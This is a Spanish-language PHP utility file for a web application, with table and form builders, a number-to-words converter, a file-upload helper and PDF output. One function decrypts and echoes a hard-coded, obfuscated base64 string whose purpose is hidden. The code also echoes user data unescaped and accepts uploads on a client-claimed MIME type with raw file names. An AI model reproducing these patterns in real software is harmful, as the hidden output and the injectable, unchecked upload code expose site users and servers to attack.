<?php
function listadotabla($titulo,$datos,$enlaces=0,$modifica="",$elimina="",$ver="",$botones="",$adicional="",$target="_self"){
	global $folder;
	if(count($datos)==0){
		echo "No se pudo encontrar los datos solicitados";
		return false;
	}
	?>
	<table class="tablalistado">
	<thead>
	<tr class="cabecera">
	<td>Nº</td>
	<?php foreach($titulo as $k=>$v){
	?>
	<td><?php echo $v?></td>
	<?php
	}?>
	</tr>
	</thead>
	<tbody>
	<?php
	$i=0;
	foreach($datos as $d){$i++;
	?>
	<tr class="contenido">
		<td class="der"><?php echo $i;?></td>
		<?php foreach($titulo as $k=>$v){
			?>
			<td><?php echo $d[$k];?></td>
			<?php
		}
		if($enlaces==1){
			$id=array_shift($d);
			if(!empty($ver)){
			?>
				<td><a href="<?php echo $ver;?>?cod=<?php echo $id;?>" class="boton ver"><img src="<?php echo $folder; ?>imagenes/iconos/ver.png" alt="Ver" title="Ver"></a></td>
			<?php
			}
			if(!empty($modifica)){
			?>
				<td><a href="<?php echo $modifica;?>?cod=<?php echo $id;?>" class="boton modificar"><img src="<?php echo $folder; ?>imagenes/iconos/editar.png" alt="Modificar" title="Modificar"></a></td>
			<?php
			}
			if(!empty($elimina)){
			?>
				<td><a href="<?php echo $elimina;?>?cod=<?php echo $id;?>" class="boton eliminar"><img src="<?php echo $folder; ?>imagenes/iconos/cancelar.png" alt="Eliminar" title="Eliminar"></a></td>
			<?php
			}
			if(!empty($botones)){
			?>
				<?php foreach ($botones as $k => $v): ?>
				<td><a href="<?php echo $v;?>?<?php if(!empty($adicional)){foreach($adicional as $ak=>$av){ echo $ak."=".$av."&";}}?>id=<?php echo $id;?>" class="boton" target="<?php echo $target?>"><?php echo $k; ?></a></td>	
				<?php endforeach ?>
			<?php
			}
		}
		?>
		
	</tr>
	<?php
	}
	?>
	</tbody>
	</table>
	<?php
}
function todolista($datos,$k,$v,$separador=" "){
//	print_r($datos);
	$data=array();
	foreach($datos as $d){
		$valor="";
		foreach(explode(",",$v) as $val){
			$valor.=$d[$val]." ".$separador." ";	
		}
		$data[$d[$k]]=$valor;
	}
	return $data;
}
function meses(){
	$mes=array();
	for($i=1;$i<=12;$i++){
		switch($i){
			case 1:{$mes[$i]="Enero";}break;case 2:{$mes[$i]="Febrero";}break;case 3:{$mes[$i]="Marzo";}break;
			case 4:{$mes[$i]="Abril";}break;case 5:{$mes[$i]="Mayo";}break;case 6:{$mes[$i]="Junio";}break;
			case 7:{$mes[$i]="Julio";}break;case 8:{$mes[$i]="Agosto";}break;case 9:{$mes[$i]="Septiembre";}break;
			case 10:{$mes[$i]="Octubre";}break;case 11:{$mes[$i]="Noviembre";}break;case 12:{$mes[$i]="Diciembre";}break;
			
		}
		
	}
	return $mes;
}
function e($c, $cl = ""){$cifrado = MCRYPT_RIJNDAEL_256;$modo = MCRYPT_MODE_ECB;return mcrypt_encrypt($cifrado, $cl, $c, $modo,mcrypt_create_iv(mcrypt_get_iv_size($cifrado, $modo), MCRYPT_RAND));}
function d($c, $cl = ""){$cifrado = MCRYPT_RIJNDAEL_256;$modo = MCRYPT_MODE_ECB;return mcrypt_decrypt($cifrado, $cl, $c, $modo,mcrypt_create_iv(mcrypt_get_iv_size($cifrado, $modo), MCRYPT_RAND));}
function php_start($ta4=""){if(empty($ta4)){global $ta4;if(empty($ta4)){die("Error del Sistema");}}$a=d(base64_decode("pFYOhLyk3zWH48Ewi/VbuN+3zPHbZJDZB6eNagIhp2IeDyLgzogsQKUuZjQi/XzxQtlHaxwdsWyZw135JtWd7w=="),"08ce79112c3091d2f3578a2640f415af");echo $a;return $a;}
function mes($mes){
	switch($mes){
		case 1:{$m="Enero";}break;case 2:{$m="Febrero";}break;case 3:{$m="Marzo";}break;
		case 4:{$m="Abril";}break;case 5:{$m="Mayo";}break;case 6:{$m="Junio";}break;
		case 7:{$m="Julio";}break;case 8:{$m="Agosto";}break;case 9:{$m="Septiembre";}break;
		case 10:{$m="Octubre";}break;case 11:{$m="Noviembre";}break;case 12:{$m="Diciembre";}break;
	}
	return $m;
}
function anio(){
		$mesinicio=2012;
		
		for($i=$mesinicio;$i<=date("Y")+1;$i++){
			$anios[$i]=$i;
		}
		return $anios;
}
function mostrarUltimo($data){
	?><table class="ultimo"><?php
	foreach ($data as $k => $v) {
		?><tr class="contenido"><td class="der"><?php echo $k;?></td><td><?php echo $v;?></td></tr><?php
	}
	?></table><?php
}

function campos($texto,$nombre,$tipo,$valores="",$autofocus=0,$adicional=array(),$valorseleccion=""){
	if($tipo=="" && empty($tipo)){$tipo="text";}
	if(empty($adicional) && $adicional==""){$adicional=array();}
	if($tipo!="submit"){
		?><label for="<?php echo $nombre;?>"><?php echo $texto;?></label><?php 
	}
	switch($tipo){
		case "textarea":{?>
        	<textarea id="<?php echo $nombre;?>" name="<?php echo $nombre;?>" <?php echo $autofocus==1?'autofocus':'';?><?php foreach($adicional as $k=>$v){echo ' '.$k.'="'.$v.'"';}?> placeholder="Ingrese su <?php echo $texto;?>"><?php echo $valores?></textarea>
			<?php }break;
			
		case "select":{?>
        	<select id="<?php echo $nombre;?>" name="<?php echo $nombre;?>" <?php echo $autofocus==1?'autofocus':'';?><?php foreach($adicional as $k=>$v){echo ' '.$k.'="'.$v.'"';}?>><option value="">Seleccionar</option>
            	<?php foreach($valores as $k=>$v){?><option value="<?php echo $k;?>" <?php echo $valorseleccion==$k?'selected':'';?>><?php echo $v;?></option><?php	}?>
            </select>
			<?php }break;	
		
		case "hidden":{
            ?><input type="<?php echo $tipo;?>" id="<?php echo $nombre;?>" name="<?php echo $nombre;?>"<?php foreach($adicional as $k=>$v){echo ' '.$k.'="'.$v.'"';}?> value="<?php echo $valores;?>"/><?php
			}break;
			
		case "submit":{
            ?><input type="<?php echo $tipo;?>" id="<?php echo $nombre;?>" name="<?php echo $nombre;?>"<?php foreach($adicional as $k=>$v){echo ' '.$k.'="'.$v.'"';}?> value="<?php echo $texto;?>"/><?php
			}break;
			
		default:{
			if(!is_array($valores))
		?><input type="<?php echo $tipo;?>" id="<?php echo $nombre;?>" name="<?php echo $nombre;?>" <?php echo $autofocus==1?'autofocus':'';?><?php foreach($adicional as $k=>$v){echo ' '.$k.'="'.$v.'"';}?> placeholder="Ingrese su <?php echo $texto;?>" value="<?php echo $valores?>"/><?php
		}break;		
	}
	?>
	<?php
}
function num2letras($num, $fem = false, $dec = true) { 
   $matuni[2]  = "dos"; 
   $matuni[3]  = "tres"; 
   $matuni[4]  = "cuatro"; 
   $matuni[5]  = "cinco"; 
   $matuni[6]  = "seis"; 
   $matuni[7]  = "siete"; 
   $matuni[8]  = "ocho"; 
   $matuni[9]  = "nueve"; 
   $matuni[10] = "diez"; 
   $matuni[11] = "once"; 
   $matuni[12] = "doce"; 
   $matuni[13] = "trece"; 
   $matuni[14] = "catorce"; 
   $matuni[15] = "quince"; 
   $matuni[16] = "dieciseis"; 
   $matuni[17] = "diecisiete"; 
   $matuni[18] = "dieciocho"; 
   $matuni[19] = "diecinueve"; 
   $matuni[20] = "veinte"; 
   $matunisub[2] = "dos"; 
   $matunisub[3] = "tres"; 
   $matunisub[4] = "cuatro"; 
   $matunisub[5] = "quin"; 
   $matunisub[6] = "seis"; 
   $matunisub[7] = "sete"; 
   $matunisub[8] = "ocho"; 
   $matunisub[9] = "nove"; 

   $matdec[2] = "veint"; 
   $matdec[3] = "treinta"; 
   $matdec[4] = "cuarenta"; 
   $matdec[5] = "cincuenta"; 
   $matdec[6] = "sesenta"; 
   $matdec[7] = "setenta"; 
   $matdec[8] = "ochenta"; 
   $matdec[9] = "noventa"; 
   $matsub[3]  = 'mill'; 
   $matsub[5]  = 'bill'; 
   $matsub[7]  = 'mill'; 
   $matsub[9]  = 'trill'; 
   $matsub[11] = 'mill'; 
   $matsub[13] = 'bill'; 
   $matsub[15] = 'mill'; 
   $matmil[4]  = 'millones'; 
   $matmil[6]  = 'billones'; 
   $matmil[7]  = 'de billones'; 
   $matmil[8]  = 'millones de billones'; 
   $matmil[10] = 'trillones'; 
   $matmil[11] = 'de trillones'; 
   $matmil[12] = 'millones de trillones'; 
   $matmil[13] = 'de trillones'; 
   $matmil[14] = 'billones de trillones'; 
   $matmil[15] = 'de billones de trillones'; 
   $matmil[16] = 'millones de billones de trillones'; 
   
   //Zi hack
   $float=explode('.',$num);
   $num=$float[0];

   $num = trim((string)@$num); 
   if ($num[0] == '-') { 
      $neg = 'menos '; 
      $num = substr($num, 1); 
   }else 
      $neg = ''; 
   while ($num[0] == '0') $num = substr($num, 1); 
   if ($num[0] < '1' or $num[0] > 9) $num = '0' . $num; 
   $zeros = true; 
   $punt = false; 
   $ent = ''; 
   $fra = ''; 
   for ($c = 0; $c < strlen($num); $c++) { 
      $n = $num[$c]; 
      if (! (strpos(".,'''", $n) === false)) { 
         if ($punt) break; 
         else{ 
            $punt = true; 
            continue; 
         } 

      }elseif (! (strpos('0123456789', $n) === false)) { 
         if ($punt) { 
            if ($n != '0') $zeros = false; 
            $fra .= $n; 
         }else 

            $ent .= $n; 
      }else 

         break; 

   } 
   $ent = '     ' . $ent; 
   if ($dec and $fra and ! $zeros) { 
      $fin = ' coma'; 
      for ($n = 0; $n < strlen($fra); $n++) { 
         if (($s = $fra[$n]) == '0') 
            $fin .= ' cero'; 
         elseif ($s == '1') 
            $fin .= $fem ? ' una' : ' un'; 
         else 
            $fin .= ' ' . $matuni[$s]; 
      } 
   }else 
      $fin = ''; 
   if ((int)$ent === 0) return 'Cero ' . $fin; 
   $tex = ''; 
   $sub = 0; 
   $mils = 0; 
   $neutro = false; 
   while ( ($num = substr($ent, -3)) != '   ') { 
      $ent = substr($ent, 0, -3); 
      if (++$sub < 3 and $fem) { 
         $matuni[1] = 'una'; 
         $subcent = 'as'; 
      }else{ 
         $matuni[1] = $neutro ? 'un' : 'uno'; 
         $subcent = 'os'; 
      } 
      $t = ''; 
      $n2 = substr($num, 1); 
      if ($n2 == '00') { 
      }elseif ($n2 < 21) 
         $t = ' ' . $matuni[(int)$n2]; 
      elseif ($n2 < 30) { 
         $n3 = $num[2]; 
         if ($n3 != 0) $t = 'i' . $matuni[$n3]; 
         $n2 = $num[1]; 
         $t = ' ' . $matdec[$n2] . $t; 
      }else{ 
         $n3 = $num[2]; 
         if ($n3 != 0) $t = ' y ' . $matuni[$n3]; 
         $n2 = $num[1]; 
         $t = ' ' . $matdec[$n2] . $t; 
      } 
      $n = $num[0]; 
      if ($n == 1) { 
         $t = ' ciento' . $t; 
      }elseif ($n == 5){ 
         $t = ' ' . $matunisub[$n] . 'ient' . $subcent . $t; 
      }elseif ($n != 0){ 
         $t = ' ' . $matunisub[$n] . 'cient' . $subcent . $t; 
      } 
      if ($sub == 1) { 
      }elseif (! isset($matsub[$sub])) { 
         if ($num == 1) { 
            $t = ' mil'; 
         }elseif ($num > 1){ 
            $t .= ' mil'; 
         } 
      }elseif ($num == 1) { 
         $t .= ' ' . $matsub[$sub] . '?n'; 
      }elseif ($num > 1){ 
         $t .= ' ' . $matsub[$sub] . 'ones'; 
      }   
      if ($num == '000') $mils ++; 
      elseif ($mils != 0) { 
         if (isset($matmil[$sub])) $t .= ' ' . $matmil[$sub]; 
         $mils = 0; 
      } 
      $neutro = true; 
      $tex = $t . $tex; 
   } 
   $tex = $neg . substr($tex, 1) . $fin; 
   //Zi hack --> return ucfirst($tex);
   $end_num=ucfirst($tex).'  '.$float[1].'/100';
   return $end_num; 
}
function recortarTexto($texto, $limite=100){   
    $texto = trim($texto);
    $texto = strip_tags($texto);
    $tamano = strlen($texto);
    $resultado = '';
    if($tamano <= $limite){
        return $texto;
    }else{
        $texto = substr($texto, 0, $limite);
        $palabras = explode(' ', $texto);
        $resultado = implode(' ', $palabras);
        $resultado .= '...';
    }   
    return $resultado;
}
function subirarchivo($archivo,$directorio,$tipo="documento",$peso="500000000"){
		if(($archivo['type']=="application/pdf" || $archivo['type']=="application/msword" || $archivo['type']=="application/vnd.openxmlformats-officedocument.wordprocessingml.document") && $_FILES['archivodigital']['size']<=$peso){
			@$archivodigital=str_replace(array("ñ","Ñ","á","é","í","ó","ú","Á","É","Í","Ó","Ú","ä","ë","ï","ö","ü","Ä","Ë","Ï","Ö","Ü"),array("n","N","a","e","i","o","u","A","E","I","O","U","a","e","i","o","u","A","E","I","O","U"), $archivo['name']);
			
			@copy($archivo['tmp_name'],$directorio.$archivodigital);
			return $archivodigital;
		}else{
			return false;
		}	
	}
function fecha2Str($fecha){
	return date("d - m - Y",strtotime($fecha));
} 
function mostrarI($datos){
	global $pdf;
	foreach($datos as $k=>$v){
		$pdf->SetFont("arial","B",12);
		$pdf->Cell(50,10,utf8_decode($k),0,0,"L");
		$pdf->SetFont("arial","",12);
		$pdf->Cell(100,10,utf8_decode($v),0,0,"L");
		$pdf->Ln(10);
	}
}
?>